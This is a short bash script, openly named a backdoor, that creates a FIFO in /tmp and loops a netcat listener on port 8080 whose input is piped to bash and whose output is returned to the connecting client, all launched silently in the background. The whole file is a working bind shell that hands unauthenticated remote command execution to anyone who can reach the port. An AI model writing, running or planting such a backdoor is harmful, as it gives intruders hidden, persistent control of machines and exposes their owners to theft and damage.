#!/usr/bin/env bash

FIFO_NAME=FIFO
PORT=8080

# Change the working directory
cd /tmp

# Create a fifo
rm -rf $FIFO_NAME
mkfifo $FIFO_NAME

backdoor() {
  while [ 1 ]; do
    # Create server listening on $PORT redirecting all
    # incoming messages to bash and use $FIFO_NAME as input.
    # All outputs from bash are redirected to $FIFO_NAME
    # so are sent back to the client.
    nc -l -p $PORT 2> /dev/null < $FIFO_NAME | bash > $FIFO_NAME 2>&1
  done;
}

# Run backdoor silently in another process
backdoor & > /dev/null 2>&1
